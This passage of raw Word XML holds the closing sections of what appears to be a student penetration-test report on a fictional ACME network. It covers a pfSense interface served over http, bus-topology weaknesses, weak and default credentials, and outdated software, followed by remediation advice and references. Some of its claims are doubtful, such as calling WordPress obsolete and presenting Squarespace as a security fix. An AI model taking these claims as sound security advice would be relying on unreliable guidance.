      <w:r w:rsidR="001D628F" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> there are several modern solutions.  WordPress has </w:t>
      </w:r>
      <w:r w:rsidR="008F023B" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>been</w:t>
      </w:r>
      <w:r w:rsidR="001D628F" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> outshined by its </w:t>
      </w:r>
      <w:r w:rsidR="001D628F" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>contemporaries in recent years and buying a URL from a service such as Squarespace would ensure that your information is more secure than it currently is.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBB53CD" w14:textId="2556EF5F" w:rsidR="00BF1B6E" w:rsidRPr="00CB0BA3" w:rsidRDefault="00AC33FB" w:rsidP="00BF1B6E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc183984565"/>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Unsecure Protocols</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="6947761C" w14:textId="435E3512" w:rsidR="008F023B" w:rsidRPr="00CB0BA3" w:rsidRDefault="001D3C5E" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:firstLine="360"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>When the tester gained access to the web server that the pfSense firewall was utilizing it became immediately clear that the protocols were vulnerable.  The web service is ruined through http protocols instead of the https counterparts that are so often recommended.  Without the securely encrypted packets the service is left easily susceptible to threat actors.  The simple fix for this would be to change the pfSense service to be run along https.  Below is a simple guide for this switch:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEE1025" w14:textId="6A6F2C73" w:rsidR="001D3C5E" w:rsidRPr="00CB0BA3" w:rsidRDefault="001D3C5E" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Log onto the pfSense service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A08F19D" w14:textId="62980473" w:rsidR="001D3C5E" w:rsidRPr="00CB0BA3" w:rsidRDefault="001D3C5E" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Navigate to GUI System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC69E4F" w14:textId="41201779" w:rsidR="001D3C5E" w:rsidRPr="00CB0BA3" w:rsidRDefault="001D3C5E" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Navigate to Advanced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090CD69B" w14:textId="798FA44B" w:rsidR="001D3C5E" w:rsidRPr="00CB0BA3" w:rsidRDefault="001D3C5E" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tick the box labeled “https”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333677C8" w14:textId="4374936C" w:rsidR="00BF1B6E" w:rsidRDefault="00DC07F2" w:rsidP="00332E3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc183984566"/>
      <w:r>
        <w:t>Physical Network</w:t>
      </w:r>
      <w:r w:rsidR="00AC33FB">
        <w:t xml:space="preserve"> Structure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="03929512" w14:textId="50213A5A" w:rsidR="00617B24" w:rsidRPr="00CB0BA3" w:rsidRDefault="007550E7" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:right="4" w:firstLine="576"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Traditionally, as labeled by Spiceworks</w:t>
      </w:r>
      <w:r w:rsidR="004F149D" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, there are seven types of network topologies.  These display several physical similarities across them but all function differently.  ACME’s network is shaped through a single cable running through each node, one after the other.  The server transmits data from one end of the cable and in a single direction to the client(Spiceworks, 2022).  This more commonly </w:t>
      </w:r>
      <w:r w:rsidR="006A0B56" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>refers</w:t>
      </w:r>
      <w:r w:rsidR="004F149D" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to a bus topology and has many benefits.  However, from a security perspective, this configuration leaves much to be desired.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083C7C77" w14:textId="2AFC0964" w:rsidR="004F149D" w:rsidRPr="00CB0BA3" w:rsidRDefault="004F149D" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:right="4" w:firstLine="576"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">From a cost perspective, the bus topology is relatively cheap as there is only a singular cable running through the system connecting nodes to one another. However, due to this nature any compromised parts of the cable have the potential of shutting the entire network down. On top of this, if a singular node is compromised, the single cable leaves no security avenues to prevent further nodes from becoming much of the same.    The low privacy as well as the physical risks are enough of a concern for the tester to suggest an alternative. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F1CD98" w14:textId="1467C10E" w:rsidR="004F149D" w:rsidRPr="00CB0BA3" w:rsidRDefault="00C66372" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:right="4" w:firstLine="432"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">If ACME is willing to spend the resources on an updated, effective network structure then a hybrid </w:t>
      </w:r>
      <w:r w:rsidR="00623F44" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>topology</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is recommended. This topology, albeit resource intensive, allows for the flexibility and security advantages that a company would want to ensure privacy and functionality across their network.  If the high cost of the hybrid model is too much for ACME’s </w:t>
      </w:r>
      <w:r w:rsidR="00623F44" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>resources,</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> then the recommended approach would be </w:t>
      </w:r>
      <w:r w:rsidR="00623F44" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">that of a ringed topology. Depending on the implementation of the ring, the network would have minimal costs whilst also being robust to singular compromised nodes.  A big disadvantage from the ring model, however, is its difficulty when adding or removing new nodes.  This process, however, is worthwhile expense to ensure that company data is </w:t>
      </w:r>
      <w:r w:rsidR="006A0B56" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>secure</w:t>
      </w:r>
      <w:r w:rsidR="00623F44" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the long run.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296D7B2E" w14:textId="0C983C41" w:rsidR="00617B24" w:rsidRDefault="00617B24" w:rsidP="00617B24">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc183984567"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="0B0F7A78" w14:textId="35F9EB0D" w:rsidR="003C384B" w:rsidRPr="003C384B" w:rsidRDefault="00617B24" w:rsidP="00CE3421">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc183984568"/>
      <w:r w:rsidRPr="003C384B">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Overall Discussion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="27DF76D3" w14:textId="3563248A" w:rsidR="006A0B56" w:rsidRPr="00CB0BA3" w:rsidRDefault="008A06DD" w:rsidP="006A0B56">
      <w:pPr>
        <w:ind w:right="4" w:firstLine="576"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">From the start of the testing the process it was immediately clear that the ACME network has several severe security flaws.  </w:t>
      </w:r>
      <w:r w:rsidR="005C6723" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>From its ancient software, the weak login information, and even its physical construction, the network needs remedies at every level.  The</w:t>
      </w:r>
      <w:r w:rsidR="006A0B56" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">se weak vectors can easily allow for a threat actor to abuse the information that the company would prefer to remain private and secure.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D44A98F" w14:textId="77777777" w:rsidR="008353C8" w:rsidRPr="00CB0BA3" w:rsidRDefault="008353C8" w:rsidP="00623F44">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">The network has several examples of weak credentials, utilizing easily sniffed and guessed passwords as well as the default given logins to several machines.  On top of this, the network has several examples of protocols run on unsecure channels.  There are several instances of http protocols being used over their https counterparts.  Furthermore, the services run along the network have decade old versions of software and often software that is obsolete in current year such as WordPress.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37698EF6" w14:textId="77777777" w:rsidR="00D6735F" w:rsidRPr="00CB0BA3" w:rsidRDefault="008353C8" w:rsidP="00623F44">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">On top of this, the physical network configuration is less than ideal.  The single cable approach is susceptible to several security risks, most notable the lack of security between nodes.  </w:t>
      </w:r>
      <w:r w:rsidR="00D6735F" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The cheap but hazardous setup for the network also leaves for physical issues if any of the routers end up corrupted or disabled.  This can lead to a network-wide blackout that can last for several days.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715E58D0" w14:textId="6AE89742" w:rsidR="00D6735F" w:rsidRPr="00CB0BA3" w:rsidRDefault="00D6735F" w:rsidP="00D6735F">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">The tester has recommended several avenues to quelch these shortcomings.  The improvement of password protocol as well as an updating of all software would allow for the network to run smoothly without the risk of threat actors gaining simple access to machines.  Furthermore, a complete physical reconstruction of the network would allow for safer, </w:t>
      </w:r>
      <w:r w:rsidR="007B2560" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>secure</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> network usage that is not nearly susceptible to physical network faults.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498F5585" w14:textId="324CE35A" w:rsidR="00A21289" w:rsidRPr="00CB0BA3" w:rsidRDefault="00D6735F" w:rsidP="00D6735F">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">In conclusion, the network will need a total overhaul of its services. The amount of security risks involved along the network has resulted in the tester recommending an immediate update to all systems on the network. From the singular firewall to the webservers, to the routers themselves there is not a single device on the network that is immune to simple, easily reproduced attacks that can compromise every device further.   </w:t>
      </w:r>
      <w:r w:rsidR="008353C8" w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FE7EA5" w14:textId="77777777" w:rsidR="00617B24" w:rsidRDefault="00617B24" w:rsidP="00617B24">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc183984569"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Future Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="4089583B" w14:textId="2382A68C" w:rsidR="00617B24" w:rsidRPr="00CB0BA3" w:rsidRDefault="00D6735F" w:rsidP="00D6735F">
      <w:pPr>
        <w:ind w:right="4" w:firstLine="431"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In the future, after the proper adjustments have been made, the tester recommends another consultation and testing to be conducted on the newly updated infrastructure.  This will ensure faults were missed and that no new vulnerabilities have manifested during the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB0BA3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">updating process. The contact information for the tester is located at the beginning of this document.  </w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="28" w:name="_Toc183984570" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="566773658"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="54A28423" w14:textId="209340B0" w:rsidR="006E34CB" w:rsidRDefault="00341658" w:rsidP="008605B2">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:ind w:left="431" w:right="4"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
          <w:bookmarkEnd w:id="28"/>
        </w:p>
        <w:sdt>
          <w:sdtPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtEndPr/>
          <w:sdtContent>
            <w:p w14:paraId="0F7FC527" w14:textId="708EDFB4" w:rsidR="00617B24" w:rsidRDefault="00617B24" w:rsidP="00261013">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="11EF8756" w14:textId="7347D849" w:rsidR="00261013" w:rsidRPr="00261013" w:rsidRDefault="00261013" w:rsidP="00261013">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
              </w:pPr>
              <w:r w:rsidRPr="00261013">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Require strong passwords: CISA</w:t>
              </w:r>
              <w:r w:rsidRPr="00261013">
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:r w:rsidR="004C6CF3">
                <w:t>2023</w:t>
              </w:r>
              <w:r w:rsidRPr="00261013">
                <w:t xml:space="preserve">) </w:t>
              </w:r>
              <w:r w:rsidRPr="00261013">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Cybersecurity and Infrastructure Security Agency CISA</w:t>
              </w:r>
              <w:r w:rsidRPr="00261013">
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId54" w:history="1">
                <w:r w:rsidRPr="00261013">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.cisa.gov/secure-our-world/require-strong-passwords</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidRPr="00261013">
                <w:t xml:space="preserve"> (Accessed: 01 </w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:t xml:space="preserve">October </w:t>
              </w:r>
              <w:r w:rsidRPr="00261013">
                <w:t xml:space="preserve">2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="63AEA4EE" w14:textId="5B9E58FB" w:rsidR="000417BB" w:rsidRPr="000417BB" w:rsidRDefault="00BD6DD2" w:rsidP="000417BB">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
              </w:pPr>
              <w:r>
                <w:t xml:space="preserve">Fabregas, Krista </w:t>
              </w:r>
              <w:r w:rsidR="003136BD">
                <w:t xml:space="preserve">and Main, Kelly </w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Best Wordpress Alternatives &amp; Competitors 2024</w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:r w:rsidR="003136BD">
                <w:t>2024</w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:t xml:space="preserve">) </w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Forbes</w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId55" w:history="1">
                <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.forbes.com/advisor/in/business/software/wordpress-alternatives</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:t xml:space="preserve">/ (Accessed: 01 </w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:t>October</w:t>
              </w:r>
              <w:r w:rsidR="000417BB" w:rsidRPr="000417BB">
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5B0337E8" w14:textId="2C8BCB75" w:rsidR="004A220B" w:rsidRPr="004A220B" w:rsidRDefault="004C6CF3" w:rsidP="004A220B">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
              </w:pPr>
              <w:r>
                <w:t>Ashtari, Hossein</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve"> (</w:t>
              </w:r>
              <w:r w:rsidR="007F6F59">
                <w:t xml:space="preserve">10 </w:t>
              </w:r>
              <w:r>
                <w:t>March, 2022</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve">) </w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Network topology diagrams and selection best practices for 2022</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve">, </w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:rPr>
                  <w:i/>
                  <w:iCs/>
                </w:rPr>
                <w:t>Spiceworks Inc</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve">. Available at: </w:t>
              </w:r>
              <w:hyperlink r:id="rId56" w:history="1">
                <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.spiceworks.com/tech/networking/articles/what-is-network-topology/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve"> (Accessed: 0</w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:t>9</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r w:rsidR="004C03C3">
                <w:t>October</w:t>
              </w:r>
              <w:r w:rsidR="004A220B" w:rsidRPr="004A220B">
                <w:t xml:space="preserve"> 2024). </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="26ECB42F" w14:textId="1349E45C" w:rsidR="00DB3716" w:rsidRPr="00DB3716" w:rsidRDefault="00DB3716" w:rsidP="00DB3716">
              <w:pPr>
                <w:ind w:left="19" w:right="6" w:hanging="709"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r w:rsidRPr="00DB3716">
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
